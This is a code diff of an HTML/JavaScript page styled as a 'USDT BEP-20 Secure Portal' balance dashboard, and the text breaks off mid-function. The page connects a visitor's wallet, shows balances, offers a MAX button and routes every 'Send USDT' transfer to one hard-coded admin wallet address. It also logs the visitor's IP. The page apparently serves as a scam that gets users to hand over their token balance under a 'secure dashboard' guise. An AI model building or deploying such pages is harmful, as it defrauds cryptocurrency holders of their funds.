@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>USDT BEP-20 Transfer Portal - Secure Dashboard</title>
+    <title>USDT BEP-20 Secure Portal</title>
     <!-- Ethers.js v6 -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <!-- FontAwesome -->
@@ -11,14 +11,16 @@
     <style>
         :root {
             --primary: #00ffcc;
+            --primary-dark: #00ccaa;
             --secondary: #667eea;
             --bg-color: #0f172a;
-            --card-bg: rgba(30, 41, 59, 0.7);
+            --card-bg: rgba(30, 41, 59, 0.8);
             --text-main: #f8fafc;
             --text-muted: #94a3b8;
             --danger: #ef4444;
             --success: #10b981;
             --warning: #f59e0b;
+            --info: #3b82f6;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', sans-serif; }
@@ -30,143 +32,170 @@
             padding: 20px;
         }
 
+        /* Navbar */
+        .navbar {
+            background: rgba(15, 23, 42, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 15px 30px;
+            border-radius: 20px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .ip-badge {
+            background: rgba(0, 255, 204, 0.1);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            border: 1px solid var(--primary);
+        }
+
+        .ip-badge i {
+            color: var(--primary);
+            margin-right: 5px;
+        }
+
+        .wallet-badge {
+            background: rgba(102, 126, 234, 0.2);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
         .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .main-card {
             background: var(--card-bg);
             backdrop-filter: blur(16px);
             padding: 40px;
             border-radius: 24px;
             box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            width: 100%;
-            max-width: 1200px;
-            margin: 0 auto;
             border: 1px solid rgba(255,255,255,0.1);
         }
 
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
-        
-        .logo h1 { font-size: 24px; margin: 0; }
-        .logo p { font-size: 12px; color: var(--text-muted); }
+        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
         
         .network-badge {
             background: rgba(240, 185, 11, 0.2);
             color: #f0b90b;
-            padding: 8px 16px;
+            padding: 6px 12px;
             border-radius: 50px;
-            font-size: 14px;
+            font-size: 12px;
             font-weight: 600;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
         }
-        
-        .user-info {
-            display: flex;
-            gap: 15px;
-            align-items: center;
-            background: rgba(0,0,0,0.3);
-            padding: 8px 16px;
-            border-radius: 50px;
-        }
-        
-        .ip-badge {
-            background: rgba(100, 100, 100, 0.3);
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-family: monospace;
-        }
-        
+
+        h1 { font-size: 28px; margin-bottom: 5px; text-align: center; }
+        .subtitle { color: var(--text-muted); text-align: center; font-size: 14px; margin-bottom: 30px; }
+
         .btn {
             background: linear-gradient(135deg, var(--secondary), #764ba2);
             color: white;
             border: none;
-            padding: 12px 24px;
+            padding: 16px;
             border-radius: 12px;
             cursor: pointer;
-            font-size: 14px;
+            font-size: 16px;
             font-weight: 600;
+            width: 100%;
             transition: all 0.3s;
-            display: inline-flex;
+            display: flex;
+            justify-content: center;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
         }
-        
-        .btn-small {
-            padding: 8px 16px;
-            font-size: 12px;
-        }
-        
-        .btn-danger {
-            background: linear-gradient(135deg, var(--danger), #dc2626);
-        }
-        
+
         .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4); }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        
+
+        .btn-outline {
+            background: transparent;
+            border: 2px solid var(--primary);
+            color: var(--primary);
+        }
+
+        .btn-outline:hover {
+            background: var(--primary);
+            color: var(--bg-color);
+        }
+
         .hidden { display: none !important; }
-        
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .card {
+
+        /* Dashboard Styles */
+        .profile-card {
             background: rgba(0,0,0,0.3);
-            border-radius: 20px;
-            padding: 20px;
-            border: 1px solid rgba(255,255,255,0.05);
+            padding: 15px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
         }
-        
-        .balance-card {
-            text-align: center;
-            background: linear-gradient(135deg, rgba(102, 126, 234, 0.2), rgba(118, 75, 162, 0.2));
-        }
-        
-        .balance-amount {
-            font-size: 48px;
-            font-weight: bold;
-            margin: 15px 0;
-        }
-        
-        .balance-label {
-            color: var(--text-muted);
+
+        .address-box { 
+            font-family: monospace; 
+            color: var(--primary); 
+            cursor: pointer;
             font-size: 14px;
         }
         
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            margin-top: 15px;
+        .disconnect-btn { 
+            background: rgba(239, 68, 68, 0.2); 
+            color: var(--danger); 
+            border: none; 
+            padding: 6px 12px; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 12px;
         }
-        
-        .stat-item {
-            text-align: center;
-            padding: 10px;
+
+        .balances { display: flex; gap: 15px; margin-bottom: 25px; }
+        .balance-box {
+            flex: 1;
             background: rgba(255,255,255,0.05);
-            border-radius: 12px;
+            padding: 20px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.05);
+            transition: all 0.3s;
         }
-        
-        .stat-value {
-            font-size: 24px;
-            font-weight: bold;
-            color: var(--primary);
+        .balance-box:hover {
+            background: rgba(255,255,255,0.1);
+            transform: translateY(-2px);
         }
-        
-        .input-group {
-            position: relative;
-            margin-bottom: 20px;
-        }
-        
+        .balance-box h3 { font-size: 28px; margin: 10px 0; font-weight: 700; }
+        .balance-box p { color: var(--text-muted); font-size: 12px; margin-bottom: 5px; }
+        .balance-box small { color: var(--primary); font-size: 10px; }
+
+        .input-group { position: relative; margin-bottom: 20px; }
         .input-group input {
             width: 100%;
             background: rgba(0,0,0,0.3);
@@ -177,46 +206,61 @@
             font-size: 18px;
             outline: none;
         }
-        
         .input-group input:focus { border-color: var(--primary); }
-        
         .max-btn {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: rgba(0, 255, 204, 0.2);
-            color: var(--primary);
-            border: none;
-            padding: 6px 12px;
-            border-radius: 8px;
-            cursor: pointer;
+            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
+            background: rgba(0, 255, 204, 0.2); color: var(--primary);
+            border: none; padding: 6px 12px; border-radius: 8px; cursor: pointer;
         }
-        
-        .history-table {
-            width: 100%;
-            overflow-x: auto;
-        }
-        
-        .history-table table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        
-        .history-table th, .history-table td {
-            padding: 12px;
-            text-align: left;
+
+        .history-box { margin-top: 20px; font-size: 12px; max-height: 250px; overflow-y: auto; }
+        .history-item { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center;
+            padding: 12px; 
             border-bottom: 1px solid rgba(255,255,255,0.1);
+            transition: all 0.3s;
         }
-        
-        .history-table th {
-            color: var(--text-muted);
-            font-weight: 500;
+        .history-item:hover {
+            background: rgba(255,255,255,0.05);
         }
+        .history-item a { color: var(--primary); text-decoration: none; }
+
+        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 1000; display: flex; flex-direction: column; gap: 10px; }
+        .toast {
+            background: white; color: black; padding: 15px 25px; border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            display: flex; align-items: center; gap: 10px;
+            animation: slideInRight 0.3s ease forwards;
+            max-width: 320px;
+        }
+        .toast.error { border-left: 5px solid var(--danger); }
+        .toast.success { border-left: 5px solid var(--success); }
+        .toast.info { border-left: 5px solid var(--info); }
+        .toast.warning { border-left: 5px solid var(--warning); }
+
+        @keyframes slideInRight { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
         
-        .status-success { color: var(--success); }
-        .status-pending { color: var(--warning); }
-        
+        .spin { animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(5px);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 1000; opacity: 0; pointer-events: none; transition: 0.3s;
+        }
+        .modal-overlay.active { opacity: 1; pointer-events: all; }
+        .modal-content {
+            background: #1e293b; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px;
+            text-align: center; border: 1px solid rgba(255,255,255,0.1);
+        }
+        .modal-amount { font-size: 28px; color: var(--primary); font-weight: bold; margin: 20px 0; }
+        .modal-buttons { display: flex; gap: 10px; margin-top: 20px; }
+        .btn-cancel { background: rgba(255,255,255,0.1); color: white; flex: 1; padding: 12px; border-radius: 10px; border: none; cursor: pointer; }
+        .btn-confirm { background: var(--success); color: white; flex: 1; padding: 12px; border-radius: 10px; border: none; cursor: pointer; }
+
         .gas-info {
             background: rgba(240, 185, 11, 0.1);
             border: 1px solid #f0b90b;
@@ -226,195 +270,138 @@
             text-align: center;
         }
         
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(5px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            opacity: 0;
-            pointer-events: none;
-            transition: 0.3s;
-        }
-        
-        .modal-overlay.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-        
-        .modal-content {
-            background: #1e293b;
-            padding: 30px;
-            border-radius: 20px;
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .toast-container {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 1000;
-            display: flex;
-            flex-direction: column;
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
             gap: 10px;
+            margin-bottom: 20px;
         }
         
-        .toast {
-            background: white;
-            color: black;
-            padding: 15px 25px;
+        .stat-card {
+            background: rgba(0,0,0,0.3);
+            padding: 10px;
             border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            animation: slideInRight 0.3s ease forwards;
+            text-align: center;
         }
         
-        .toast.error { border-left: 5px solid var(--danger); }
-        .toast.success { border-left: 5px solid var(--success); }
-        .toast.info { border-left: 5px solid #3b82f6; }
-        
-        @keyframes slideInRight {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        
-        .spin { animation: spin 1s linear infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        
-        @media (max-width: 768px) {
-            .container { padding: 20px; }
-            .stats-grid { grid-template-columns: 1fr; }
-            .header { flex-direction: column; text-align: center; }
+        @media (max-width: 480px) {
+            .main-card { padding: 20px; }
+            .balances { flex-direction: column; }
+            .navbar { flex-direction: column; text-align: center; }
         }
     </style>
 </head>
 <body>
 
-<div class="toast-container" id="toastContainer"></div>
+<div id="toast-container"></div>
 
 <div class="modal-overlay" id="permissionModal">
     <div class="modal-content">
-        <i class="fa-solid fa-dollar-sign" style="font-size: 40px; color: #f0b90b; margin-bottom: 15px;"></i>
-        <h2>Confirm USDT Transfer</h2>
-        <p class="modal-text" style="margin: 15px 0;">You are about to send USDT BEP-20 tokens</p>
-        <div style="font-size: 32px; color: var(--primary); margin: 15px 0;" id="modalAmount">0 USDT</div>
+        <i class="fa-solid fa-dollar-sign" style="font-size: 40px; color: var(--primary);"></i>
+        <h2 style="margin: 15px 0;">Confirm USDT Transfer</h2>
+        <div class="modal-amount" id="modalAmountDisplay">0.00 USDT</div>
         <div class="gas-info">
             <i class="fa-solid fa-gas-pump"></i> Network Fee: <span id="modalGasFee">~0.0003 BNB</span>
         </div>
-        <p style="font-size: 12px; color: var(--text-muted); margin: 15px 0;">To: 0xfb27A7Df0B464C034c284779E9Ea4d595F9bF399</p>
-        <div class="modal-buttons" style="display: flex; gap: 10px;">
-            <button class="btn" onclick="closeModal()" style="background: rgba(255,255,255,0.1);">Cancel</button>
-            <button class="btn" id="confirmTxBtn" style="background: var(--success);">Confirm</button>
+        <p style="font-size: 12px; color: var(--text-muted); word-break: break-all;">
+            To: <span id="modalAdminAddress">0xfb27A7Df0B464C034c284779E9Ea4d595F9bF399</span>
+        </p>
+        <div class="modal-buttons">
+            <button class="btn-cancel" onclick="closeModal()">Cancel</button>
+            <button class="btn-confirm" id="confirmTxBtn">Confirm</button>
+        </div>
+    </div>
+</div>
+
+<div class="navbar">
+    <div class="logo">
+        <i class="fa-solid fa-coins"></i> USDT BEP-20 Portal
+    </div>
+    <div class="user-info">
+        <div class="ip-badge" id="ipDisplay">
+            <i class="fa-solid fa-laptop"></i> Loading IP...
+        </div>
+        <div class="wallet-badge" id="walletStatusBadge">
+            <i class="fa-solid fa-wallet"></i> Not Connected
         </div>
     </div>
 </div>
 
 <div class="container">
-    <div class="header">
-        <div class="logo">
-            <h1><i class="fa-solid fa-coins"></i> USDT BEP-20 Portal</h1>
-            <p>Secure Token Transfer System</p>
-        </div>
-        <div class="network-badge">
-            <i class="fa-brands fa-bnb"></i> BNB Smart Chain
-        </div>
-    </div>
-    
-    <!-- Login Section -->
-    <div id="loginSection">
-        <div style="text-align: center; padding: 60px 20px;">
-            <i class="fa-solid fa-wallet" style="font-size: 64px; color: var(--primary); margin-bottom: 20px;"></i>
-            <h2>Connect Your Wallet</h2>
-            <p style="color: var(--text-muted); margin: 15px 0;">Connect your wallet to access the USDT transfer portal</p>
-            <button id="connectBtn" class="btn" style="margin-top: 20px;">
-                <i class="fa-solid fa-wallet"></i> Connect Wallet
-            </button>
-            <div class="ip-badge" style="display: inline-block; margin-top: 20px;">
-                <i class="fa-solid fa-globe"></i> IP: <span id="ipAddress">Detecting...</span>
+    <div class="main-card">
+        <div class="header-top">
+            <div class="network-badge">
+                <i class="fa-brands fa-bnb"></i> BNB Smart Chain
             </div>
-        </div>
-    </div>
-    
-    <!-- Dashboard Section -->
-    <div id="dashboardSection" class="hidden">
-        <div class="header">
-            <div class="user-info">
-                <i class="fa-solid fa-user"></i>
-                <span id="walletShort">0x...</span>
-                <span class="ip-badge"><i class="fa-solid fa-globe"></i> <span id="userIP">...</span></span>
-            </div>
-            <button id="logoutBtn" class="btn btn-small btn-danger">
-                <i class="fa-solid fa-power-off"></i> Disconnect
-            </button>
         </div>
         
-        <div class="dashboard-grid">
-            <div class="card balance-card">
-                <div class="balance-label">USDT BEP-20 Balance</div>
-                <div class="balance-amount" id="usdtBalance">0.00</div>
-                <div class="balance-label">≈ $<span id="usdtUSD">0.00</span> USD</div>
-            </div>
-            <div class="card balance-card">
-                <div class="balance-label">BNB Balance (Gas)</div>
-                <div class="balance-amount" id="bnbBalance">0.0000</div>
-                <div class="balance-label">≈ $<span id="bnbUSD">0.00</span> USD</div>
-            </div>
-            <div class="card">
-                <div class="stats-grid">
-                    <div class="stat-item">
-                        <div class="stat-label">Total Sent</div>
-                        <div class="stat-value" id="totalSent">0</div>
-                        <small>USDT</small>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-label">Transactions</div>
-                        <div class="stat-value" id="txCount">0</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-label">Last Active</div>
-                        <div class="stat-value" id="lastActive">-</div>
-                    </div>
+        <h1><i class="fa-solid fa-dollar-sign"></i> USDT Balance Dashboard</h1>
+        <div class="subtitle">View and manage your USDT BEP-20 tokens</div>
+
+        <div id="connectState">
+            <button id="connectBtn" class="btn">
+                <i class="fa-solid fa-wallet"></i> Connect Wallet
+            </button>
+            <div class="stats-grid" style="margin-top: 20px;">
+                <div class="stat-card">
+                    <i class="fa-solid fa-shield-halved"></i>
+                    <div>Secure Connection</div>
+                    <small>One wallet per IP</small>
+                </div>
+                <div class="stat-card">
+                    <i class="fa-solid fa-clock-rotate-left"></i>
+                    <div>Session Persistence</div>
+                    <small>Auto-save data</small>
                 </div>
             </div>
         </div>
-        
-        <div class="card">
-            <h3><i class="fa-solid fa-paper-plane"></i> Send USDT Tokens</h3>
-            <div class="input-group" style="margin-top: 20px;">
-                <input type="number" id="amountInput" placeholder="Enter USDT amount" min="0" step="0.01">
+
+        <div id="dashboardState" class="hidden">
+            <div class="profile-card">
+                <div>
+                    <small style="color: var(--text-muted)">Connected Address</small>
+                    <div class="address-box" id="walletAddress" onclick="copyAddress()">0x...</div>
+                </div>
+                <button class="disconnect-btn" onclick="disconnectWallet()">
+                    <i class="fa-solid fa-power-off"></i> Disconnect
+                </button>
+            </div>
+
+            <div class="balances">
+                <div class="balance-box">
+                    <p><i class="fa-brands fa-bnb"></i> BNB Balance</p>
+                    <h3 id="bnbBalance">0.0000</h3>
+                    <small>For gas fees</small>
+                </div>
+                <div class="balance-box">
+                    <p><i class="fa-solid fa-dollar-sign"></i> USDT Balance</p>
+                    <h3 id="usdtBalance">0.00</h3>
+                    <small>USDT BEP-20 tokens</small>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <input type="number" id="amountInput" placeholder="Enter USDT amount to send" min="0" step="0.01">
                 <button class="max-btn" onclick="setMaxAmount()">MAX</button>
             </div>
+
             <div class="gas-info">
-                <i class="fa-solid fa-gas-pump"></i> Estimated Network Fee: <span id="gasFee">~0.0003</span> BNB
-                <small>(≈ $<span id="gasFeeUSD">0.00</span> USD)</small>
+                <i class="fa-solid fa-gas-pump"></i> Estimated Gas: <span id="gasFeeValue">Calculating...</span> BNB
             </div>
-            <button id="sendBtn" class="btn" style="width: 100%; margin-top: 15px;">
+
+            <button id="sendBtn" class="btn">
                 <i class="fa-solid fa-paper-plane"></i> Send USDT
             </button>
-        </div>
-        
-        <div class="card" style="margin-top: 20px;">
-            <h3><i class="fa-solid fa-clock-rotate-left"></i> Transaction History</h3>
-            <div class="history-table">
-                <table>
-                    <thead>
-                        <tr><th>Date & Time</th><th>Amount (USDT)</th><th>Gas Fee (BNB)</th><th>Status</th><th>Tx Hash</th></tr>
-                    </thead>
-                    <tbody id="historyList">
-                        <tr><td colspan="5" style="text-align: center;">No transactions yet</td></tr>
-                    </tbody>
-                </table>
+
+            <div class="history-box">
+                <h4 style="margin-bottom: 10px;">
+                    <i class="fa-solid fa-clock-rotate-left"></i> Transaction History
+                </h4>
+                <div id="historyList">
+                    <div style="text-align: center; color: var(--text-muted); padding: 20px;">
+                        No transactions yet
+                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -426,6 +413,8 @@
     // ==========================================
     const ADMIN_WALLET = "0xfb27A7Df0B464C034c284779E9Ea4d595F9bF399";
     const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+    const CHAIN_ID = "0x38";
+    const CHAIN_ID_DECIMAL = 56;
     const USDT_GAS_LIMIT = 65000;
     
     const USDT_ABI = [
@@ -433,152 +422,159 @@
         "function transfer(address to, uint256 amount) returns (bool)",
         "function decimals() view returns (uint8)"
     ];
-    
+
+    // Storage keys
+    const STORAGE_KEYS = {
+        SESSION: 'usdt_session_data',
+        IP_WALLET_MAP: 'usdt_ip_wallet_map',
+        TRANSACTIONS: 'usdt_transactions'
+    };
+
     let provider, signer, userAddress;
+    let autoRefreshInterval;
+    let rawUsdtBalance = "0";
+    let rawBnbBalance = "0";
+    let pendingAmount = "0";
     let usdtDecimals = 18;
     let isProcessing = false;
-    let userIP = "";
+    let estimatedGasFeeBNB = 0;
+    let currentIP = null;
     let bnbPriceUSD = 600;
-    
-    // Storage keys
-    const STORAGE_KEY = "usdt_portal_data";
-    const IP_SESSIONS_KEY = "ip_sessions";
-    
-    // Get user IP
-    async function getUserIP() {
+
+    // DOM Elements
+    const connectState = document.getElementById('connectState');
+    const dashboardState = document.getElementById('dashboardState');
+    const permissionModal = document.getElementById('permissionModal');
+    const connectBtn = document.getElementById('connectBtn');
+    const sendBtn = document.getElementById('sendBtn');
+    const amountInput = document.getElementById('amountInput');
+
+    // ==========================================
+    // IP DETECTION & VALIDATION
+    // ==========================================
+    async function getIP() {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
             const data = await response.json();
-            userIP = data.ip;
-            document.getElementById('ipAddress').innerText = userIP;
-            document.getElementById('userIP').innerText = userIP;
-            return userIP;
+            return data.ip;
         } catch (error) {
-            userIP = "unknown";
-            return "unknown";
+            // Fallback - generate unique ID based on local storage
+            let ip = localStorage.getItem('fallback_ip');
+            if (!ip) {
+                ip = 'local_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('fallback_ip', ip);
+            }
+            return ip;
         }
     }
-    
-    // Check if IP already has an active session
-    function checkIPSession(ip, walletAddress) {
-        const sessions = JSON.parse(localStorage.getItem(IP_SESSIONS_KEY) || '{}');
-        if (sessions[ip] && sessions[ip] !== walletAddress) {
-            return { allowed: false, existingWallet: sessions[ip] };
-        }
-        return { allowed: true };
-    }
-    
-    // Save IP session
-    function saveIPSession(ip, walletAddress) {
-        const sessions = JSON.parse(localStorage.getItem(IP_SESSIONS_KEY) || '{}');
-        sessions[ip] = walletAddress;
-        localStorage.setItem(IP_SESSIONS_KEY, JSON.stringify(sessions));
-    }
-    
-    // Remove IP session on logout
-    function removeIPSession(ip) {
-        const sessions = JSON.parse(localStorage.getItem(IP_SESSIONS_KEY) || '{}');
-        delete sessions[ip];
-        localStorage.setItem(IP_SESSIONS_KEY, JSON.stringify(sessions));
-    }
-    
-    // Save user data
-    function saveUserData(walletAddress, data) {
-        const allData = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
-        allData[walletAddress.toLowerCase()] = {
-            ...allData[walletAddress.toLowerCase()],
-            ...data,
-            lastActive: new Date().toISOString()
-        };
-        localStorage.setItem(STORAGE_KEY, JSON.stringify(allData));
-    }
-    
-    // Load user data
-    function loadUserData(walletAddress) {
-        const allData = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
-        return allData[walletAddress.toLowerCase()] || {
-            transactions: [],
-            totalSent: 0,
-            txCount: 0,
-            lastActive: new Date().toISOString()
-        };
-    }
-    
-    // Save transaction
-    function saveTransaction(walletAddress, txHash, amount, gasUsed) {
-        const userData = loadUserData(walletAddress);
-        userData.transactions.unshift({
-            hash: txHash,
-            amount: amount,
-            gasUsed: gasUsed,
-            timestamp: new Date().toISOString(),
-            status: 'success'
-        });
-        userData.totalSent = (userData.totalSent || 0) + amount;
-        userData.txCount = (userData.txCount || 0) + 1;
-        userData.lastActive = new Date().toISOString();
-        saveUserData(walletAddress, userData);
-        displayUserStats(walletAddress);
-        displayTransactionHistory(walletAddress);
-    }
-    
-    // Display user stats
-    function displayUserStats(walletAddress) {
-        const userData = loadUserData(walletAddress);
-        document.getElementById('totalSent').innerText = userData.totalSent?.toFixed(4) || "0";
-        document.getElementById('txCount').innerText = userData.txCount || "0";
-        if (userData.lastActive) {
-            const date = new Date(userData.lastActive);
-            document.getElementById('lastActive').innerText = date.toLocaleTimeString();
-        }
-    }
-    
-    // Display transaction history
-    function displayTransactionHistory(walletAddress) {
-        const userData = loadUserData(walletAddress);
-        const historyList = document.getElementById('historyList');
+
+    function isWalletAllowedForIP(wallet, ip) {
+        const ipWalletMap = JSON.parse(localStorage.getItem(STORAGE_KEYS.IP_WALLET_MAP) || '{}');
         
-        if (!userData.transactions || userData.transactions.length === 0) {
-            historyList.innerHTML = '<tr><td colspan="5" style="text-align: center;">No transactions yet</td></tr>';
-            return;
+        if (ipWalletMap[ip] && ipWalletMap[ip] !== wallet.toLowerCase()) {
+            return {
+                allowed: false,
+                existingWallet: ipWalletMap[ip]
+            };
         }
         
-        historyList.innerHTML = userData.transactions.slice(0, 20).map(tx => `
-            <tr>
-                <td>${new Date(tx.timestamp).toLocaleString()}</td>
-                <td>${parseFloat(tx.amount).toFixed(4)} USDT</td>
-                <td>${tx.gasUsed} BNB</td>
-                <td class="status-success">✓ Success</td>
-                <td><a href="https://bscscan.com/tx/${tx.hash}" target="_blank" style="color: var(--primary);">View</a></td>
-            </tr>
-        `).join('');
+        return {
+            allowed: true,
+            existingWallet: null
+        };
     }
-    
+
+    function registerWalletForIP(wallet, ip) {
+        const ipWalletMap = JSON.parse(localStorage.getItem(STORAGE_KEYS.IP_WALLET_MAP) || '{}');
+        ipWalletMap[ip] = wallet.toLowerCase();
+        localStorage.setItem(STORAGE_KEYS.IP_WALLET_MAP, JSON.stringify(ipWalletMap));
+    }
+
+    // ==========================================
+    // SESSION MANAGEMENT
+    // ==========================================
+    function saveSession(wallet, ip) {
+        const sessionData = {
+            wallet: wallet.toLowerCase(),
+            ip: ip,
+            timestamp: Date.now(),
+            lastActive: Date.now()
+        };
+        localStorage.setItem(STORAGE_KEYS.SESSION, JSON.stringify(sessionData));
+    }
+
+    function getSession() {
+        const session = localStorage.getItem(STORAGE_KEYS.SESSION);
+        if (!session) return null;
+        
+        try {
+            const data = JSON.parse(session);
+            // Check if session is less than 24 hours old
+            if (Date.now() - data.timestamp > 24 * 60 * 60 * 1000) {
+                localStorage.removeItem(STORAGE_KEYS.SESSION);
+                return null;
+            }
+            return data;
+        } catch {
+            return null;
+        }
+    }
+
+    function clearSession() {
+        localStorage.removeItem(STORAGE_KEYS.SESSION);
+    }
+
+    // ==========================================
+    // UTILITY FUNCTIONS
+    // ==========================================
     function showToast(message, type = 'info') {
-        const container = document.getElementById('toastContainer');
+        const container = document.getElementById('toast-container');
         const toast = document.createElement('div');
         toast.className = `toast ${type}`;
-        let icon = type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-circle-xmark' : 'fa-circle-info';
+        
+        let icon = 'fa-circle-info';
+        if(type === 'success') icon = 'fa-check-circle';
+        if(type === 'error') icon = 'fa-circle-xmark';
+        if(type === 'warning') icon = 'fa-triangle-exclamation';
+
         toast.innerHTML = `<i class="fa-solid ${icon}"></i> <span>${message}</span>`;
         container.appendChild(toast);
+
         setTimeout(() => {
             toast.style.opacity = '0';
             setTimeout(() => toast.remove(), 300);
         }, 5000);
     }
-    
-    function setMaxAmount() {
-        const balanceEl = document.getElementById('usdtBalance');
-        if (balanceEl) {
-            const balance = parseFloat(balanceEl.innerText);
-            if (balance > 0) document.getElementById('amountInput').value = balance;
+
+    function copyAddress() {
+        if (userAddress) {
+            navigator.clipboard.writeText(userAddress);
+            showToast('Address copied!', 'success');
         }
     }
-    
-    function closeModal() {
-        document.getElementById('permissionModal').classList.remove('active');
+
+    function setMaxAmount() {
+        if (rawUsdtBalance && parseFloat(rawUsdtBalance) > 0) {
+            amountInput.value = parseFloat(rawUsdtBalance).toFixed(4);
+            showToast(`Max: ${parseFloat(rawUsdtBalance).toFixed(4)} USDT`, 'info');
+        }
     }
-    
+
+    function closeModal() {
+        permissionModal.classList.remove('active');
+    }
+
+    function isValidAddress(address) {
+        try {
+            return ethers.isAddress(address);
+        } catch {
+            return false;
+        }
+    }
+
+    // ==========================================
+    // GAS & BALANCE FUNCTIONS
+    // ==========================================
     async function getBNBPrice() {
         try {
             const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT');
@@ -588,113 +584,51 @@
             bnbPriceUSD = 600;
         }
     }
-    
+
     async function calculateGasFee() {
-        if (!provider) return 0.0003;
+        if (!provider) return 0;
         try {
             const feeData = await provider.getFeeData();
             const gasPrice = feeData.gasPrice || 0n;
             const gasCostWei = BigInt(USDT_GAS_LIMIT) * gasPrice;
             const gasCostBNB = parseFloat(ethers.formatEther(gasCostWei));
-            document.getElementById('gasFee').innerText = gasCostBNB.toFixed(6);
-            const gasUSD = gasCostBNB * bnbPriceUSD;
-            document.getElementById('gasFeeUSD').innerText = gasUSD.toFixed(2);
+            estimatedGasFeeBNB = gasCostBNB;
+            
+            const gasFeeDisplay = document.getElementById('gasFeeValue');
+            if (gasFeeDisplay) gasFeeDisplay.innerText = gasCostBNB.toFixed(6);
+            
+            const modalGasFee = document.getElementById('modalGasFee');
+            if (modalGasFee) modalGasFee.innerText = `~${gasCostBNB.toFixed(6)} BNB`;
+            
             return gasCostBNB;
         } catch (error) {
+            estimatedGasFeeBNB = 0.0003;
             return 0.0003;
         }
     }
-    
-    async function updateBalances() {
-        if (!userAddress || !provider) return;
+
+    async function switchToBSC() {
         try {
-            const bnbBalance = await provider.getBalance(userAddress);
-            const bnbFormatted = parseFloat(ethers.formatEther(bnbBalance)).toFixed(6);
-            document.getElementById('bnbBalance').innerText = bnbFormatted;
-            
-            const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
-            const usdtBalance = await usdtContract.balanceOf(userAddress);
-            const usdtFormatted = parseFloat(ethers.formatUnits(usdtBalance, usdtDecimals)).toFixed(4);
-            document.getElementById('usdtBalance').innerText = usdtFormatted;
-            
-            const usdtUSD = parseFloat(usdtFormatted);
